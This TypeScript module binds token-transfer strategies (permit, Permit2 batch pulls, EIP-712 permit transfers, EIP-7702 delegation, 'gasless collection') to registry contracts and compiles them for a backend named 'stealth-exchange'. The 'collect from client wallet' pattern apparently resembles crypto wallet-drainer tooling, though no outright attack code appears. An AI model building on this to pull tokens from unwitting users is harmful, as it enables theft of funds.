import type { ContractFunctionBinding, StrategyMode } from '@/lib/types';
import { getExecutionBackendEntry, isStrategyAvailable, getStrategyFunction } from '@/lib/contract-registry';

/**
 * Strategy Preset Bindings
 *
 * Maps each strategy mode to:
 * 1. Primary execution contract & function (derived from CONTRACT_REGISTRY)
 * 2. Fallback function (if applicable)
 * 3. Required parameters
 * 4. ABI extraction from actual contracts
 *
 * ALL contracts from CONTRACT_REGISTRY are wired — no hardcoding.
 */

// Helper: Get function for a contract + strategy combination
// 1. Check explicit strategyFunctions mapping first
// 2. Fall back to pattern search in ABI
type AbiFunctionEntry = {
  type: 'function';
  name: string;
};

function isAbiFunctionEntry(value: unknown): value is AbiFunctionEntry {
  if (!value || typeof value !== 'object') return false;
  const entry = value as { type?: unknown; name?: unknown };
  return entry.type === 'function' && typeof entry.name === 'string';
}

function getContractStrategyFunction(
  contractId: string,
  strategy: StrategyMode,
  abi: readonly unknown[] | undefined,
  patterns: readonly string[],
  preferredKey?: string
): { name: string; key: string } | null {
  if (!Array.isArray(abi)) return null;
  const functions = abi.filter(isAbiFunctionEntry);

  // First: check explicit mapping
  const explicitFunc = getStrategyFunction(contractId, strategy);
  if (explicitFunc) {
    const func = functions.find((entry) => entry.name === explicitFunc);
    if (func) return { name: func.name, key: `${func.name}(...)` };
  }

  // Fall back: search by pattern
  // First try exact match for preferred key
  if (preferredKey) {
    const preferredName = preferredKey.split('(')[0];
    const exact = functions.find((entry) => entry.name === preferredName);
    if (exact) return { name: exact.name, key: preferredKey };
  }

  // Then try pattern matching
  for (const pattern of patterns) {
    const normalizedPattern = pattern.toLowerCase();
    const func = functions.find(
      (entry) => entry.name.toLowerCase().includes(normalizedPattern)
    );
    if (func) return { name: func.name, key: `${func.name}(...)` };
  }

  return null;
}

export interface StrategyPreset {
  mode: StrategyMode;
  label: string;
  description: string;
  primaryBinding: ContractFunctionBinding;
  fallbackBinding?: ContractFunctionBinding;
  requiresApproval: boolean;
  requiresPermit: boolean;
  requiresEIP712: boolean;
}

export function getStrategyPresetBindings(strategy: {
  mode: StrategyMode;
  executionBackend: string;
}): StrategyPreset | null {
  // Check if this strategy is supported by the selected backend
  if (!isStrategyAvailable(strategy.executionBackend, strategy.mode)) {
    return null; // Strategy not compatible with this contract
  }

  switch (strategy.mode) {
    case 'permit2':
      return getPermit2Preset(strategy.executionBackend);
    case 'permit':
      return getPermitPreset(strategy.executionBackend);
    case 'multicall':
      return getMulticallPreset(strategy.executionBackend);
    case 'eip712':
      return getEIP712Preset(strategy.executionBackend);
    case 'eip7702':
      return getEIP7702Preset(strategy.executionBackend);
    case 'gasless':
      return getGaslessPreset(strategy.executionBackend);
    case 'direct':
      return getDirectPreset(strategy.executionBackend);
    case 'approve':
      return getApprovePreset(strategy.executionBackend);
    case 'trails':
      return getTrailsPreset(strategy.executionBackend);
    default:
      return null;
  }
}

function getDirectPreset(backend: string): StrategyPreset | null {
  const backend_entry = getExecutionBackendEntry(backend);
  if (!backend_entry) return null;

  // Find transfer function in selected contract
  const transferFunc = getContractStrategyFunction(
    backend,
    'direct',
    backend_entry.abi,
    ['transfer', 'send', 'pull'],
    'transferFrom(address,address,uint256)'
  );
  if (!transferFunc) return null;

  return {
    mode: 'direct',
    label: 'Direct Transfer',
    description: `Direct transfer using ${backend_entry.name}`,
    primaryBinding: {
      preset: 'direct',
      label: `${backend_entry.name} Transfer`,
      contractAddress: backend_entry.address,
      contractName: backend_entry.name,
      abi: backend_entry.abi,
      functionKey: transferFunc.key,
      functionName: transferFunc.name,
      stateMutability: 'nonpayable',
      args: [
        { name: 'from', type: 'address', value: '$wallet' },
        { name: 'to', type: 'address', value: '$recipient' },
        { name: 'amount', type: 'uint256', value: '0' },
      ],
    },
    requiresApproval: true,
    requiresPermit: false,
    requiresEIP712: false,
  };
}

function getApprovePreset(backend: string): StrategyPreset | null {
  const backend_entry = getExecutionBackendEntry(backend);
  if (!backend_entry) return null;

  const approveFunc = getContractStrategyFunction(
    backend,
    'approve',
    backend_entry.abi,
    ['approve', 'setAllowance'],
    'approve(address,uint256)'
  );
  if (!approveFunc) return null;

  const transferFunc = getContractStrategyFunction(
    backend,
    'approve',
    backend_entry.abi,
    ['transfer', 'send', 'pull'],
    'transferFrom(address,address,uint256)'
  );

  return {
    mode: 'approve',
    label: 'Approve + Transfer',
    description: `Set approval on ${backend_entry.name}, then transfer`,
    primaryBinding: {
      preset: 'approve',
      label: `${backend_entry.name} Approval`,
      contractAddress: backend_entry.address,
      contractName: backend_entry.name,
      abi: backend_entry.abi,
      functionKey: approveFunc.key,
      functionName: approveFunc.name,
      stateMutability: 'nonpayable',
      args: [
        { name: 'spender', type: 'address', value: '$backend' },
        { name: 'amount', type: 'uint256', value: '0' },
      ],
    },
    fallbackBinding: transferFunc ? {
      preset: 'approve-transfer',
      label: `${backend_entry.name} Transfer`,
      contractAddress: backend_entry.address,
      contractName: backend_entry.name,
      abi: backend_entry.abi,
      functionKey: transferFunc.key,
      functionName: transferFunc.name,
      stateMutability: 'nonpayable',
      args: [
        { name: 'from', type: 'address', value: '$wallet' },
        { name: 'to', type: 'address', value: '$recipient' },
        { name: 'amount', type: 'uint256', value: '0' },
      ],
    } : undefined,
    requiresApproval: true,
    requiresPermit: false,
    requiresEIP712: false,
  };
}

function getPermit2Preset(backend: string): StrategyPreset | null {
  const backend_entry = getExecutionBackendEntry(backend);
  if (!backend_entry) return null;

  // Look for batch permit or collect functions
  const permitFunc = getContractStrategyFunction(
    backend,
    'permit2',
    backend_entry.abi,
    ['permit', 'collect', 'pull', 'batch'],
    'pullBatchFromAllowance(address,address[],uint256[])'
  );
  if (!permitFunc) return null;

  return {
    mode: 'permit2',
    label: 'Permit2 Collection',
    description: `Use Permit2 with ${backend_entry.name} for token collection`,
    primaryBinding: {
      preset: 'permit2',
      label: `${backend_entry.name} Permit2 Pull`,
      contractAddress: backend_entry.address,
      contractName: backend_entry.name,
      abi: backend_entry.abi,
      functionKey: permitFunc.key,
      functionName: permitFunc.name,
      stateMutability: 'nonpayable',
      args: [
        { name: 'client', type: 'address', value: '$wallet' },
        { name: 'tokens', type: 'address[]', value: '[]' },
        { name: 'amounts', type: 'uint256[]', value: '[]' },
      ],
    },
    requiresApproval: false,
    requiresPermit: true,
    requiresEIP712: true,
  };
}

function getPermitPreset(backend: string): StrategyPreset | null {
  const backend_entry = getExecutionBackendEntry(backend);
  if (!backend_entry) return null;

  const permitFunc = getContractStrategyFunction(
    backend,
    'permit',
    backend_entry.abi,
    ['permit', 'collect'],
    'permitAndCollect(address,address,uint256,uint8,bytes32,bytes32)'
  );
  if (!permitFunc) return null;

  return {
    mode: 'permit',
    label: 'ERC-2612 Permit',
    description: `Use ERC-2612 permit with ${backend_entry.name}`,
    primaryBinding: {
      preset: 'permit',
      label: `${backend_entry.name} Permit & Collect`,
      contractAddress: backend_entry.address,
      contractName: backend_entry.name,
      abi: backend_entry.abi,
      functionKey: permitFunc.key,
      functionName: permitFunc.name,
      stateMutability: 'nonpayable',
      args: [
        { name: 'token', type: 'address', value: '0x' },
        { name: 'client', type: 'address', value: '$wallet' },
        { name: 'amount', type: 'uint256', value: '0' },
        { name: 'v', type: 'uint8', value: '0' },
        { name: 'r', type: 'bytes32', value: '0x' },
        { name: 's', type: 'bytes32', value: '0x' },
      ],
    },
    requiresApproval: false,
    requiresPermit: true,
    requiresEIP712: true,
  };
}

function getMulticallPreset(backend: string): StrategyPreset | null {
  const backend_entry = getExecutionBackendEntry(backend);
  if (!backend_entry) return null;

  const batchFunc = getContractStrategyFunction(
    backend,
    'multicall',
    backend_entry.abi,
    ['batch', 'multicall', 'aggregate'],
    'batch((address,uint256,bytes,bool)[])'
  );
  if (!batchFunc) return null;

  return {
    mode: 'multicall',
    label: 'Batch Multicall',
    description: `Execute multiple calls using ${backend_entry.name}`,
    primaryBinding: {
      preset: 'multicall',
      label: `${backend_entry.name} Batch`,
      contractAddress: backend_entry.address,
      contractName: backend_entry.name,
      abi: backend_entry.abi,
      functionKey: batchFunc.key,
      functionName: batchFunc.name,
      stateMutability: 'payable',
      args: [
        {
          name: 'calls',
          type: 'tuple[]',
          value: '[]',
        },
      ],
    },
    requiresApproval: false,
    requiresPermit: false,
    requiresEIP712: false,
  };
}

function getEIP712Preset(backend: string): StrategyPreset | null {
  const backend_entry = getExecutionBackendEntry(backend);
  if (!backend_entry) return null;

  const eip712Func = getContractStrategyFunction(
    backend,
    'eip712',
    backend_entry.abi,
    ['permitTransfer', 'batchPermit', 'eip712'],
    'batchPermitTransferFromBatch(address,((address,uint160,uint48,uint48)[],address,uint256),bytes,address)'
  );
  if (!eip712Func) return null;

  return {
    mode: 'eip712',
    label: 'EIP-712 Typed Data',
    description: `Use EIP-712 structured signing with ${backend_entry.name}`,
    primaryBinding: {
      preset: 'eip712',
      label: `${backend_entry.name} EIP-712 Permit Transfer`,
      contractAddress: backend_entry.address,
      contractName: backend_entry.name,
      abi: backend_entry.abi,
      functionKey: eip712Func.key,
      functionName: eip712Func.name,
      stateMutability: 'nonpayable',
      args: [
        { name: 'user', type: 'address', value: '$wallet' },
        { name: 'permitBatch', type: 'tuple', value: '{"details":[],"spender":"$recipient","sigDeadline":"0"}' },
        { name: 'signature', type: 'bytes', value: '0x' },
        { name: 'recipient', type: 'address', value: '$recipient' },
      ],
    },
    requiresApproval: false,
    requiresPermit: true,
    requiresEIP712: true,
  };
}

function getEIP7702Preset(backend: string): StrategyPreset | null {
  const backend_entry = getExecutionBackendEntry(backend);
  if (!backend_entry) return null;

  const delegateFunc = getContractStrategyFunction(
    backend,
    'eip7702',
    backend_entry.abi,
    ['execute', 'delegate', 'batch'],
    'executeBatch((address,uint256,bytes)[])'
  );
  if (!delegateFunc) return null;

  return {
    mode: 'eip7702',
    label: 'EIP-7702 Delegation',
    description: `Use EIP-7702 delegation with ${backend_entry.name}`,
    primaryBinding: {
      preset: 'eip7702',
      label: `${backend_entry.name} EIP-7702 Delegate`,
      contractAddress: backend_entry.address,
      contractName: backend_entry.name,
      abi: backend_entry.abi,
      functionKey: delegateFunc.key,
      functionName: delegateFunc.name,
      stateMutability: 'nonpayable',
      args: [
        {
          name: 'calls',
          type: 'tuple[]',
          value: '[]',
        },
      ],
    },
    requiresApproval: false,
    requiresPermit: false,
    requiresEIP712: false,
  };
}

function getGaslessPreset(backend: string): StrategyPreset | null {
  // Gasless uses a combination of strategies depending on configuration
  // Default to EIP-7702 if available, fall back to Permit2
  const eip7702Preset = getEIP7702Preset(backend);
  if (eip7702Preset) {
    return {
      ...eip7702Preset,
      mode: 'gasless',
      label: 'Gasless (EIP-7702)',
      description: `Gasless collection via EIP-7702 delegation with ${backend}`,
    };
  }

  return getPermit2Preset(backend);
}

function getTrailsPreset(backend: string): StrategyPreset | null {
  const backend_entry = getExecutionBackendEntry(backend);
  if (!backend_entry) return null;

  const routeFunc = getContractStrategyFunction(
    backend,
    'trails',
    backend_entry.abi,
    ['route', 'execute', 'swap'],
    'routeAndExecute(bytes,address)'
  );
  if (!routeFunc) return null;

  return {
    mode: 'trails',
    label: 'Trails Routing',
    description: `Use Trails routing with ${backend_entry.name}`,
    primaryBinding: {
      preset: 'trails',
      label: `${backend_entry.name} Trails Route`,
      contractAddress: backend_entry.address,
      contractName: backend_entry.name,
      abi: backend_entry.abi,
      functionKey: routeFunc.key,
      functionName: routeFunc.name,
      stateMutability: 'payable',
      args: [
        { name: 'routeData', type: 'bytes', value: '0x' },
        { name: 'recipient', type: 'address', value: '$recipient' },
      ],
    },
    requiresApproval: false,
    requiresPermit: false,
    requiresEIP712: false,
  };
}

/**
 * Get all strategy presets compiled into an SDK bundle
 */
export function compileAllStrategyPresets(): Record<StrategyMode, StrategyPreset | null> {
  const modes: StrategyMode[] = [
    'direct',
    'approve',
    'permit',
    'permit2',
    'multicall',
    'eip712',
    'eip7702',
    'gasless',
    'trails',
  ];

  const presets: Record<StrategyMode, StrategyPreset | null> = {} as any;

  for (const mode of modes) {
    presets[mode] = getStrategyPresetBindings({
      mode,
      executionBackend: 'stealth-exchange',
    });
  }

  return presets;
}
